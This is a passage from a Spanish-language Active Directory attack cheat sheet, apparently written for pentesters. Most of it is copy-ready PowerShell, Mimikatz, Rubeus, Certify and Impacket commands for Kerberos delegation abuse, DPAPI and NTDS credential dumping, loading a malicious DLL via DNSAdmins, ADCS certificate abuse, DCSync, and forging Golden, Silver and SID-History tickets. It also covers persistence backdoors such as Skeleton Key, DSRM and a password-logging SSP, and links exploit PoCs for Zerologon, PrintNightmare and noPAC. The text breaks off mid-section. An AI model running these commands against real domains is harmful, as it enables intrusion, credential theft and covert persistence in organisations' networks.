Si disponemos de permisos como `GenericAll` o `GenericWrite` sobre una cuenta de usuario del dominio, podemos **forzar la asignación de un SPN**, solicitar su TGS, y luego **fuerzarlo offline** como en un ataque Kerberoast.

- PowerView:

```powershell
# Verificar permisos interesantes sobre cuentas (por ejemplo RDPUsers)
Invoke-ACLScanner -ResolveGUIDs | ? { $_.IdentinyReferenceName -match "RDPUsers" }

# Ver si el usuario ya tiene algún SPN asignado
Get-DomainUser -Identity <NombreUsuario> | select serviceprincipalname

# Forzar el seteo de un SPN en la cuenta
Set-DomainObject <NombreUsuario> -Set @{serviceprincipalname='ops/loquesea1'}
```

- Con el módulo **ActiveDirectory (AD Module)**:

```powershell
# Ver si el usuario ya tiene algún SPN asignado
Get-ADUser -Identity <NombreUsuario> -Properties ServicePrincipalName | select ServicePrincipalName

# Forzar el seteo del SPN
Set-ADUser -Identity <NombreUsuario> -ServicePrincipalNames @{Add='ops/loquesea1'}
```

Usa cualquiera de las herramientas anteriores (`Rubeus`, `Invoke-Kerberoast`, etc.) para solicitar el TGS, extraer el blob cifrado y crackear el hash.

##### Abuso de Shadow Copies (Copias de Sombra)

Si tienes acceso como **administrador local** en una máquina, puedes listar y montar las Shadow Copies. Es una forma sencilla de realizar **escalada de privilegios** en un entorno de dominio o acceder a información sensible.

```powershell
# Listar copias de sombra con vssadmin (requiere privilegios de administrador)
vssadmin list shadows

# Listar copias de sombra con diskshadow
diskshadow list shadows all

# Crear un enlace simbólico a la shadow copy y acceder a ella
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

**📌 ¿Qué puedes hacer desde la Shadow Copy?**

1. **Volcar la base de datos SAM** antigua y extraer hashes de contraseñas.    
2. **Buscar credenciales almacenadas con DPAPI** y desencriptarlas.    
3. **Acceder a archivos sensibles de backup**, como:    
    - `NTDS.dit` (si es un DC)        
    - Archivos de configuración, bases de datos locales, scripts de inicio, etc.

##### Listar y Descifrar Credenciales Almacenadas con Mimikatz

Las credenciales cifradas mediante **DPAPI** suelen almacenarse en:

- `%appdata%\Microsoft\Credentials`    
- `%localappdata%\Microsoft\Credentials`

```powershell
# Enumerar un archivo de credenciales con mimikatz
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<HashDelFichero>"

# De la salida anterior, nos interesa el campo "guidMasterKey", que indica qué MasterKey se usó para cifrar la credencial.
# Enumerar esa Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<SIDdelUsuario>\<GUIDdeMasterKey>"

# Si estamos en el contexto del usuario (o SYSTEM) al que pertenece la credencial,
# podemos usar el flag /rpc para delegar el descifrado de la MasterKey al controlador de dominio:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<SIDdelUsuario>\<GUIDdeMasterKey>" /rpc

# La MasterKey queda ahora cacheada localmente:
dpapi::cache

# Finalmente, volvemos a descifrar la credencial usando la MasterKey cacheada:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<HashDelFichero>"
```

📄 **Artículo detallado recomendado:**  
[**DPAPI all the things** (mimikatz wiki)](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

##### Unconstrained Delegation (Delegación no restringida)

_¿Qué es esto?_  
Si tenemos acceso como **administrador local** en una máquina con **delegación no restringida habilitada**, podemos **esperar a que un objetivo de alto valor (como un Domain Admin)** se conecte a dicha máquina.  
En ese momento, podremos **robar su TGT**, hacer un **Pass-The-Ticket** y **suplantar su identidad**.

Usando PowerView:

```powershell
# Descubrir equipos unidos al dominio que tengan delegación no restringida activada
Get-NetComputer -UnConstrained

# Listar tickets y comprobar si algún DA u objetivo de alto valor ha almacenado su TGT
Invoke-Mimikatz -Command '"sekurlsa::tickets"'

# Monitorizar conexiones entrantes en el equipo comprometido (ej: esperando a un DA)
Invoke-UserHunter -ComputerName <NombreDelEquipo> -Poll <SegundosDeMonitorización> -UserName <UsuarioObjetivo> -Delay <Intervalo> -Verbose

# Volcar los tickets a disco
Invoke-Mimikatz -C
```

✅ **Nota**:  
También se puede usar **Rubeus** para listar, extraer o importar tickets (`Rubeus dump`, `Rubeus ptt`, etc.).
##### Constrained Delegation

_¿Qué es esto?_  
Cuando un usuario o equipo tiene **delegación restringida (constrained delegation)**, puede **impersonar a otro usuario** para acceder a servicios específicos definidos mediante SPN. Si tenemos control sobre dicha cuenta, podemos abusar de esta capacidad para escalar privilegios.

- Usando PowerView y Kekeo:

```powershell
# Enumerar usuarios y equipos con delegación restringida habilitada
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

# Solicitar un TGT válido para el usuario delegado
tgt::ask /user:<NombreUsuario> /domain:<DominioFQDN> /rc4:<HashNTLMdelUsuario>

# Solicitar un TGS para el usuario que queremos suplantar, hacia un servicio autorizado por la delegación
tgs::s4u /tgt:<RutaAlTGT> /user:<UsuarioASuplantar>@<DominioFQDN> /service:<SPNdelServicio>

# Inyectar el TGS con Mimikatz (Pass-The-Ticket)
Invoke-Mimikatz -Command '"kerberos::ptt <RutaAlTGS>"'
```

🦊 Alternativa con **Rubeus**

```powershell
Rubeus.exe s4u /user:<NombreUsuarioDelegado> /rc4:<HashNTLM> /impersonateuser:<UsuarioASuplantar> /msdsspn:"<SPNdelServicio>" /altservice:<Opcional> /ptt
```

> ✅ Esto inyecta directamente el TGS y nos permite acceder al servicio como si fuésemos el usuario suplantado.

🚩 **¿Y si tenemos delegación solo para un SPN específico? (Ej. `TIME`)**

Podemos abusar de una función de Kerberos llamada **"alternative service"**. Esto nos permite **solicitar tickets TGS para otros servicios alternativos** que estén soportados por el host, aunque no estén explícitamente definidos en la delegación.  
De esta forma, ganamos **acceso total sobre la máquina de destino**, ya que podemos obtener TGS válidos para servicios como `HOST`, `CIFS`, `RPCSS`, etc., si están disponibles.

##### Resource Based Constrained Delegation (RBCD)

_¿Qué es esto?_  
**TL;DR**:  
Si tenemos permisos **GenericAll** o **GenericWrite** sobre el **objeto de cuenta de máquina** de un equipo del dominio, podemos **abusar de esa delegación** para **impersonarnos como cualquier usuario**, incluyendo Domain Admins, hacia ese equipo.  
Esto nos da **acceso total** al recurso objetivo.

 🧰 Herramientas necesarias:

- [**PowerView**](https://github.com/PowerShellMafia/PowerSploit/tree/dev/Recon) – Enumeración de permisos en AD    
- [**Powermad**](https://github.com/Kevin-Robertson/Powermad) – Creación de cuentas de máquina desde PowerShell    
- [**Rubeus**](https://github.com/GhostPack/Rubeus) – Ticket abuse, S4U, PTT, etc.

Primero, debes actuar en el **contexto de seguridad del usuario o máquina** que tiene los privilegios sobre el objeto de equipo.  
Esto puede hacerse mediante:

- **Pass-The-Hash**    
- **RDP**    
- **Credenciales válidas (PSCredential)**    
- **Inyección de token o uso de servicios comprometidos**

Ejemplo de Explotación: Resource-Based Constrained Delegation

```powershell
# Importar Powermad y crear una nueva cuenta de máquina en el dominio
. .\Powermad.ps1
New-MachineAccount -MachineAccount <NombreCuentaMáquina> -Password $(ConvertTo-SecureString 'p@ssword!' -AsPlainText -Force) -Verbose

# Importar PowerView y obtener el SID de la cuenta recién creada
. .\PowerView.ps1
$ComputerSid = Get-DomainComputer <NombreCuentaMáquina> -Properties objectsid | Select -Expand objectsid

# Construir un ACE (Access Control Entry) con ese SID, usando un descriptor de seguridad en bruto
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)

# Establecer el descriptor de seguridad en el campo msDS-AllowedToActOnBehalfOfOtherIdentity de la máquina objetivo
Get-DomainComputer TargetMachine | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
```

**Abusar de la delegación con Rubeus**

```powershell
# Obtener el hash RC4 de la cuenta de máquina recién creada
Rubeus.exe hash /password:'p@ssword!'

# Usar Rubeus para suplantar al Domain Admin sobre el servicio cifs del equipo objetivo
Rubeus.exe s4u /user:<NombreCuentaMáquina> /rc4:<HashRC4> /impersonateuser:Administrator /msdsspn:cifs/TargetMachine.wtver.domain /domain:wtver.domain /ptt

# Acceder al recurso compartido de sistema (C$)
dir \\TargetMachine.wtver.domain\C$
```

 📚 Artículos recomendados:

- [Wagging the Dog: Abusing RBCD – Shenanigans Labs](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)    
- [RBCD Abuse – Stealthbits](https://blog.stealthbits.com/resource-based-constrained-delegation-abuse/)

**Truco extra: `tgtdeleg` (cuando no tienes hash/contraseña)**

En ataques de **Constrained Delegation o RBCD**, si **no tienes la contraseña o hash** de la cuenta que tiene la propiedad `TRUSTED_TO_AUTH_FOR_DELEGATION`, puedes usar este truco con **Rubeus** o **Kekeo**:

```powershell
# Obtener un TGT delegable para la cuenta actual y usarlo en vez del hash
Rubeus.exe tgtdeleg /nowrap
```

Con esto engañas a Kerberos para que te devuelva un TGT válido, que puedes reutilizar para los ataques descritos (por ejemplo, vía `s4u` + `ptt`).

🔗 Artículo: [**Rubeus – Now With More Kekeo**](https://www.harmj0y.net/blog/redteaming/rubeus-now-with-more-kekeo/)

##### DNSAdmins Abuse

_¿Qué es esto?_  
Si un usuario es miembro del grupo **DNSAdmins**, puede posiblemente cargar una **DLL arbitraria** con los privilegios del proceso `dns.exe`, que se ejecuta como **SYSTEM**.  
Si el **Controlador de Dominio (DC)** también actúa como servidor DNS, este abuso puede conducir a **escalada de privilegios hasta Domain Admin**.

> 📌 _Este método requiere permisos para reiniciar el servicio DNS._

1. **Enumerar miembros del grupo DNSAdmins**:

Con **PowerView**:

```powershell
Get-NetGroupMember -GroupName "DNSAdmins"
```

Con el módulo **ActiveDirectory (AD Module)**:

```powershell
Get-ADGroupMember -Identity DNSAdmins
```

2. Comprometer una cuenta miembro del grupo

(Existen múltiples formas: password spraying, pass-the-hash, phishing, etc.)

3. Cargar una DLL maliciosa vía red SMB y configurarla como plugin del servidor DNS:

```powershell
# Usar dnscmd para configurar la DLL del servidor DNS
dnscmd <NombreDelServidorDNS> /config /serverlevelplugindll \\Ruta\A\Nuestra\Dll\malicious.dll

# Reiniciar el servicio DNS para activar la carga de la DLL
sc \\<NombreDelServidorDNS> stop dns
sc \\<NombreDelServidorDNS> start dns
```

⚠️ **Nota de seguridad**: La DLL se ejecutará como SYSTEM en el servidor DNS, así que asegúrate de que se mantenga persistencia o se ejecute un payload controlado.

##### Abuso del DNS Integrado en Active Directory (ADIDNS)

El DNS en entornos Active Directory puede ser explotado si está **integrado en el dominio**. Los registros DNS se almacenan como objetos en AD, y usuarios con permisos pueden modificarlos o inyectar registros maliciosos (por ejemplo, para realizar ataques de **spoofing, MITM, o envenenamiento de respuestas**).

- [Exploiting Active Directory-Integrated DNS](https://blog.netspi.com/exploiting-adidns/)
- [ADIDNS Revisited](https://blog.netspi.com/adidns-revisited/)
- [Inveigh](https://github.com/Kevin-Robertson/Inveigh)

##### Abuso del grupo **Backup Operators**

_¿Qué es esto?_  
Si comprometemos una cuenta que sea miembro del grupo **Backup Operators**, esta tiene el privilegio `SeBackupPrivilege`, lo que nos permite **crear una Shadow Copy del DC**, extraer la base de datos `ntds.dit`, **volcar los hashes** y escalar a **Domain Admin**.

1. Una vez que tengamos acceso a una cuenta que tiene _SeBackupPrivilege_ podemos acceder al DC y crear una copia sombra usando el binario firmado _diskshadow_

```powershell
# Crear un fichero de script para diskshadow
Script -> {
  set context persistent nowriters
  set metadata c:\windows\system32\spool\drivers\color\example.cab
  set verbose on
  begin backup
  add volume c: alias mydrive
  create
  expose %mydrive% w:
  end backup
}

# Ejecutar diskshadow con el script anterior
diskshadow /s script.txt
   ```

2. Copiar `ntds.dit` y el hive del sistema usando APIs Win32 (SeBackupPrivilege)

Para ello usamos este repositorio:  
👉 [**SeBackupPrivilege**](https://github.com/giuliano108/SeBackupPrivilege)

   ```powershell
# Importar los módulos necesarios del repositorio
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

# Verificar si SeBackupPrivilege está habilitado
Get-SeBackupPrivilege

# Si no lo está, habilitarlo
Set-SeBackupPrivilege

# Copiar ntds.dit desde la Shadow Copy
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\temp\ntds.dit -Overwrite

# Volcar el hive SYSTEM
reg save HKLM\SYSTEM c:\temp\system.hive

   ```

3. Extraer los archivos a tu máquina local

- Usar `smbclient.py` de **Impacket** u otro método para descargar `ntds.dit` y `system.hive`.

3. Volcar los hashes con **secretsdump.py**

```powershell
secretsdump.py -system system.hive -ntds ntds.dit LOCAL
```

5. Realizar **Pass-The-Hash** con **psexec**, `wmiexec.py`, `smbexec.py`, etc., para obtener acceso como **Domain Admin**.

##### Abuso de Exchange

- [**Abusing Exchange: One API call from DA**](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)  
    → Cómo abusar de permisos delegados en Exchange para llegar a Domain Admin en un solo paso.    
- [**CVE-2020-0688**](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)  
    → Ejecución remota de código en Exchange mediante claves criptográficas reutilizadas.    
- [**PrivExchange**](https://github.com/dirkjanm/PrivExchange)  
    → Herramienta para abusar de Exchange y escalar privilegios a DA mediante NTLM relay.

##### Weaponizing Printer Bug

- [**Printer Server Bug to Domain Admin**](https://www.dionach.com/blog/printer-server-bug-to-domain-administrator/)  
    → Explotación del "printer bug" para provocar autenticación automática y relanzar a servicios.    
- [**NetNTLMtoSilverTicket**](https://github.com/NotMedic/NetNTLMtoSilverTicket)  
    → Herramienta para transformar un hash NetNTLMv2 capturado en un Silver Ticket válido.

##### Abuso de ACLs en AD

- [**Escalando privilegios con ACLs en AD** (Fox-IT)](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)  
    → Técnicas para abusar de permisos mal configurados en objetos de AD.    
- [**aclpwn.py**](https://github.com/fox-it/aclpwn.py)  
    → Herramienta para encontrar y abusar rutas de escalada a DA mediante ACLs.    
- [**Invoke-ACLPwn**](https://github.com/fox-it/Invoke-ACLPwn)  
    → Versión en PowerShell para ejecución desde entornos Windows sin necesidad de Python.

##### Abuso de IPv6 en redes IPv4 con mitm6

- [**Comprometiendo redes IPv4 vía IPv6** (mitm6)](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)  
    → Explicación del ataque donde se habilita IPv6 para interceptar tráfico en redes puramente IPv4.    
- [**mitm6**](https://github.com/fox-it/mitm6)  
    → Herramienta que permite spoofing de respuestas DHCPv6 para capturar autenticaciones NTLM.

##### SID History Abuse

_¿Qué es esto?_  
Si comprometemos un **dominio hijo** dentro de un **bosque de Active Directory**, y **SID Filtering** no está activado (lo cual es común), podemos **escalar privilegios hasta el dominio raíz**, incluyendo **Enterprise Admin**.

Esto es posible gracias al campo **SID History** en el **ticket TGT Kerberos**, que permite definir **SIDs adicionales** (grupos y privilegios extra). Al forjar un ticket con un SID extra del grupo `Enterprise Admins`, se obtienen esos privilegios.

**Ejemplo de explotación**

```powershell
# Obtener el SID del dominio actual
Get-DomainSID -Domain current.root.domain.local

# Obtener el SID del dominio raíz
Get-DomainSID -Domain root.domain.local

# Construir el SID del grupo Enterprise Admins
# Formato: <SID_del_dominio_raíz>-519

# Forjar un Golden Ticket con el SID extra de Enterprise Admins
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<SIDDomActual> /krbtgt:<HashKRBTGT> /sids:<SIDEnterpriseAdmins> /startoffset:0 /endin:600 /renewmax:10080 /ticket:C:\path\golden.kirbi

# Inyectar el ticket en memoria
kerberos::ptt C:\path\golden.kirbi

# Acceder a recursos del DC del dominio raíz
dir \\dc.root.domain.local\C$

# O bien hacer DCsync para volcar hashes
lsadump::dcsync /domain:root.domain.local /all

```

Lecturas recomendadas

- [**Kerberos Golden Tickets are Now More Golden** – AD Security](https://adsecurity.org/?p=1640)    
- [**A Guide to Attacking Domain Trusts** – harmj0y](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)

##### Explotación de SharePoint

- [**CVE-2019-0604**](https://medium.com/@gorkemkaradeniz/sharepoint-cve-2019-0604-rce-exploitation-ab3056623b7d) – **Ejecución remota de código (RCE)**  
    → Vulnerabilidad ampliamente explotada en entornos reales. Permite ejecutar comandos como SYSTEM mediante carga de archivos maliciosos en SharePoint.  
    [**PoC disponible**](https://github.com/k8gege/CVE-2019-0604)
    
- [**CVE-2019-1257**](https://www.zerodayinitiative.com/blog/2019/9/18/cve-2019-1257-code-execution-on-microsoft-sharepoint-through-bdc-deserialization) – **Ejecución de código a través de deserialización de BDC**  
    → Abuso de la funcionalidad de Business Data Connectivity para cargar objetos deserializados y ejecutar código arbitrario.
    
- [**CVE-2020-0932**](https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconverters) – **RCE mediante `TypeConverters`**  
    → Permite ejecución remota de código usando manipulaciones dentro de archivos de configuración personalizados en listas de SharePoint.  
    [**PoC**](https://github.com/thezdi/PoC/tree/master/CVE-2020-0932)

##### Zerologon

>Vulnerabilidad crítica en el protocolo **Netlogon** que permite a un atacante no autenticado tomar control total del **Controlador de Dominio (DC)**, reiniciar su contraseña de máquina y obtener acceso de **Domain Admin**.

- [**Zerologon: Unauthenticated domain controller compromise** – White Paper de Secura](https://www.secura.com/whitepapers/zerologon-whitepaper)    
- [**SharpZeroLogon**](https://github.com/nccgroup/nccfsas/tree/main/Tools/SharpZeroLogon) – Implementación en C# del exploit.    
- [**Invoke-ZeroLogon**](https://github.com/BC-SECURITY/Invoke-ZeroLogon) – Implementación en PowerShell.    
- [**Zer0Dump**](https://github.com/bb00/zer0dump) – Implementación en Python basada en **Impacket**.

##### PrintNightmare

> Vulnerabilidad en el servicio **Print Spooler** de Windows que permite a un atacante autenticado realizar **ejecución remota de código** como SYSTEM e incluso escalar privilegios o moverse lateralmente.

- [**CVE-2021-34527 – Detalles de la vulnerabilidad**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-34527)    
- [**Impacket implementation**](https://github.com/cube0x0/CVE-2021-1675) – PoC funcional y fiable usando la librería Impacket.    
- [**SharpPrintNightmare**](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare) – PoC en C# para explotación directa en entornos Windows.

##### Abuso de Active Directory Certificate Services (ADCS)

Identificación de plantillas vulnerables con [Certify](https://github.com/GhostPack/Certify):

> Certify puede ejecutarse directamente desde consola o desde Cobalt Strike usando `execute-assembly`.

```powershell
.\Certify.exe find /vulnerable /quiet
```

**Plantillas vulnerables: ¿qué buscar?**

- `msPKI-Certificate-Name-Flag` → Debe estar en **`ENROLLEE_SUPPLIES_SUBJECT`**    
- Derechos de inscripción (Enrollment Rights) → **Permitir a usuarios autenticados o Domain Users**    
- `pkiextendedkeyusage` → Debe contener **`Client Authentication`**    
- `Authorized Signatures Required` → Debe estar en **`0`**

**¿Por qué funciona esto?**  
Permite que un atacante especifique un **UPN arbitrario**, como el de un **Domain Admin**, y solicite un certificado válido. Luego, puede **autenticarse con ese certificado**, sin conocer contraseña ni hash.

> ⚠️ **Nota:** Si el Domain Admin objetivo es miembro del grupo **Protected Users**, este ataque puede fallar. Verifica antes de elegir la cuenta a suplantar.

----

**Solicitar el certificado del Domain Admin con Certify:**

```powershell
.\Certify.exe request /template:<NombrePlantilla> /quiet /ca:"<NombreCA>" /domain:<dominio.com> /path:CN=Configuration,DC=<dominio>,DC=com /altname:<UPN_DA> /machine
```

> Esto debería devolver un certificado **válido** para el Domain Admin objetivo.

**Formato del archivo `cert.pem`**

El certificado devuelto se compone de dos partes (`cert.key` y `cert.pem`) que deben unirse en un único archivo `.pem` con **una línea en blanco entre ambos bloques**

```
-----BEGIN RSA PRIVATE KEY-----
[... clave privada ...]
-----END RSA PRIVATE KEY-----

-----BEGIN CERTIFICATE-----
[... certificado ...]
-----END CERTIFICATE-----
```

----

**Convertir certificado a formato PKCS#12 (`.pfx`) con `openssl`**

El comando `openssl` puede utilizarse para convertir el certificado `cert.pem` generado anteriormente a un archivo `.pfx` (formato PKCS#12). Durante el proceso puede solicitarse una contraseña de exportación, que puede ser cualquiera.

```bash
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

----

**Subida del archivo `.pfx` al host comprometido**

Una vez generado el `.pfx`, debes subirlo a la máquina comprometida. Puedes usar diversos métodos:
- PowerShell (`Invoke-WebRequest`, `BitsTransfer`)    
- Compartición SMB    
- `certutil.exe`    
- Función `upload` de **Cobalt Strike**    
- Python HTTP server + `curl`/`wget` desde Windows

----

**Solicitar un TGT y cargarlo en memoria con **Rubeus*****

Una vez el `.pfx` está en el sistema comprometido, puedes usar [**Rubeus**](https://github.com/GhostPack/Rubeus) para pedir un **TGT Kerberos válido** con ese certificado e inyectarlo directamente en memoria:

```powershell
.\Rubeus.exe asktgt /user:<AltName_DomainAdmin> /domain:<dominio.com> /dc:<IP_o_Hostname_DC> /certificate:<RutaLocalAlPFX> /nowrap /ptt
```

> ✅ Esto inyectará el TGT directamente en la sesión actual y te permitirá actuar como **Domain Admin**, sin necesidad de contraseña ni hash.

**Acciones posteriores:**

Una vez cargado el ticket:
- Volcado de hashes (`DCSync`)    
- Acceso a recursos (shares, RDP, LDAP, etc.)    
- Persistencia y movimiento lateral


##### **No PAC (noPAC)** – Abuso de CVE-2021-42278 + CVE-2021-42287

**¿Qué es esto?**  
Una combinación de dos vulnerabilidades en entornos Active Directory que permite a un atacante con una cuenta de usuario estándar:

1. Suplantar el `sAMAccountName` de un controlador de dominio (DC).    
2. Pedir un TGT a Kerberos donde se devuelve un ticket válido con el SID de Domain Admin.    

Si no se han aplicado los parches correspondientes, **se puede obtener acceso DA con una simple cuenta de usuario**.

----

**📚 Recursos clave:**

- [**sAMAccountname Spoofing (thehacker.recipes)**](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)  
    → Explicación técnica del abuso de los campos `sAMAccountName` y `PAC`.    
- [**Weaponisation of CVE-2021-42287/42278**](https://exploit.ph/cve-2021-42287-cve-2021-42278-weaponisation.html)  
    → Guía paso a paso para explotar ambas vulnerabilidades en conjunto.    

---

**🧰 Herramientas para explotación:**

- [**noPac (cube0x0)**](https://github.com/cube0x0/noPac)  
    → Herramienta en C# para explotación directa de ambas CVEs.    
- [**sam-the-admin**](https://github.com/WazeHell/sam-the-admin)  
    → Herramienta en Python para automatizar el ataque.    
- [**noPac (Ridter)**](https://github.com/Ridter/noPac)  
    → Versión mejorada de `sam-the-admin` con más automatización y soporte.    

---

🔒 **Mitigación**:  
Aplica los parches de noviembre de 2021 para CVE-2021-42278 y CVE-2021-42287 en todos los controladores de dominio.  
Además, revisa los logs de eventos Kerberos por tickets emitidos con `sAMAccountName` inusuales.

### Persistencia en el Dominio

**¿Qué es esto?**  
Hace referencia a técnicas empleadas para **mantener acceso prolongado** y encubierto dentro de un entorno Active Directory comprometido. Estas técnicas suelen abusar de componentes internos del dominio (como Kerberos, GPOs o ACLs) y permiten al atacante **recuperar privilegios sin necesidad de reexplotar** vulnerabilidades iniciales.
##### Ataque con Golden Ticket

Este ataque permite **forjar un TGT (Ticket Granting Ticket) completamente personalizado** y válido para cualquier usuario, sin necesidad de autenticación legítima. Requiere acceso al **hash de la cuenta KRBTGT** del dominio.

```powershell
#Ejecutar mimikatz en el DC como Domain Admin para obtener el hash de krbtgt:
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -ComputerName <NombreDelDC>

#En cualquier máquina:
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<NombreDelDominio> /sid:<SIDdelDominio> /krbtgt:<HashDeLaCuentaKrbtgt> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

##### Ataque DCsync

El ataque DCSync simula el comportamiento de un **Controlador de Dominio** y solicita a Active Directory la **replicación de credenciales de usuarios** (incluyendo NTLM hashes y datos sensibles como `krbtgt`).  
Este ataque **no necesita acceso físico al DC**, pero sí privilegios de alto nivel:

- Ser **Domain Admin**, **Enterprise Admin**, o    
- Tener privilegios: `DS-Replication-Get-Changes` **y** `DS-Replication-Get-Changes-All`.

```powershell
#DCSync con mimikatz (requiere privilegios altos)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<NombreDominio>\<NombreDeUsuario>"'

#DCSync con secretsdump.py (Impacket) usando autenticación NTLM
secretsdump.py <Dominio>/<Usuario>:<Contraseña>@<IP_o_FQDN_del_DC> -just-dc-ntlm

#DCSync con secretsdump.py usando autenticación Kerberos (ticket ya en memoria)
secretsdump.py -no-pass -k <Dominio>/<Usuario>@<IP_o_FQDN_del_DC> -just-dc-ntlm
```

**Consejo:**
 /ptt     -> inyecta el ticket en la sesión actual en ejecución
 /ticket  -> guarda el ticket en el sistema para usarlo más tarde

##### Ataque Silver Ticket con mimikatz

**¿Qué es esto?**  
El ataque **Silver Ticket** permite crear un ticket de servicio (TGS) falsificado para acceder directamente a un servicio en un servidor (como CIFS, HTTP, MSSQL, etc.), **sin pasar por el DC**.  
Se requiere el **hash NTLM del servicio objetivo (SPN)**, que suele obtenerse al comprometer su cuenta asociada (por ejemplo, la de una máquina o un servicio gestionado).

✅ A diferencia del Golden Ticket, este ataque es **más sigiloso**, ya que **no involucra al controlador de dominio** durante la autenticación.

```powershell
Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'
```

📚 [Ver lista de SPNs comunes](https://adsecurity.org/?page_id=183)

##### Skeleton Key Attack

El ataque **Skeleton Key** carga una **puerta trasera en memoria** dentro del proceso `lsass.exe` del **controlador de dominio (DC)**.  
Esto permite que **todas las cuentas del dominio** puedan autenticarse con su contraseña real **o con la contraseña universal `mimikatz`** mientras el DC esté encendido (persistencia en RAM).

✅ Solo afecta mientras no se reinicie el DC.

```powershell
#Comando de explotación (como Domain Admin):
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <FQDN_del_DC>

#Autenticación con cualquier cuenta usando "mimikatz" como contraseña
Enter-PSSession -ComputerName <CualquierEquipo> -Credential <Dominio>\Administrator
```

##### DSRM Abuse (Directory Services Restore Mode)

**¿Qué es esto?**  
Cada **Controlador de Dominio (DC)** en un entorno Active Directory tiene una cuenta **local de Administrador**, asociada al **modo de restauración de servicios de directorio (DSRM)**.  
Esta cuenta tiene su propia contraseña (**SafeBackupPassword**) almacenada en el **SAM**, y **no está gestionada por GPO ni políticas de dominio**.

📌 Si extraemos su **hash NTLM**, podemos usar **Pass-The-Hash** para autenticarnos como **administrador local del DC**, **aunque no tengamos control del dominio**.

```powershell
#Volcar la contraseña DSRM (requiere privilegios de Domain Admin):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName <NombreDelDC>

#Conectarse al DC y habilitar el inicio de sesión interactivo del usuario DSRM:
Enter-PSSession -ComputerName <NombreDelDC>

#Modificar el comportamiento de inicio de sesión del administrador DSRM:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD -Verbose

#Si ya existe, simplemente modificar:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -Verbose
```

Ahora puedes usar el **hash NTLM del DSRM** con técnicas como **PTH (Pass-The-Hash)** para acceder como **administrador local al DC**, incluso si el dominio está inaccesible o comprometido parcialmente.

##### Custom SSP (Security Support Provider)

**¿Qué es esto?**  
Podemos crear o insertar un **SSP personalizado** (Security Support Provider), como `mimilib.dll` de **Mimikatz**, para interceptar y registrar las **credenciales en texto claro** de todos los usuarios que inicien sesión en el sistema, incluyendo Domain Admins.

☠️ **Requiere privilegios de administrador local o SYSTEM en el DC.**

**Desde powershell:**

```powershell
# Obtener los Security Packages actuales
$packages = Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' | select -ExpandProperty  'Security Packages'

# Añadir mimilib a la lista
$packages += "mimilib"

# Actualizar las claves del registro
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig\" -Name 'Security Packages' -Value $packages
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name 'Security Packages' -Value $packages
```

🚀 Alternativa rápida (en memoria, sin reinicio):

```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```

Todos los inicios de sesión del sistema quedarán registrados (con usuario y contraseña en texto claro) en:

```
C:\Windows\System32\kiwissp.log
```

### Cross Forest Attacks

##### Trust Tickets

**¿Qué es esto?**  
Si tienes privilegios de **Domain Admin** en un dominio que mantiene una **relación de confianza bidireccional** con otro bosque de Active Directory, puedes **extraer la clave de confianza (Trust Key)** y forjar un **TGT inter-realm**, permitiéndote acceder al bosque externo.

⚠️ El acceso estará **limitado a los permisos reales** que tu cuenta tenga definidos en el dominio de destino (el trust no te da automáticamente control total).

- Usando Mimikatz:

```powershell
#Volcar la Trust Key entre bosques
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

#Forjar un TGT inter-realm con ataque Golden Ticket
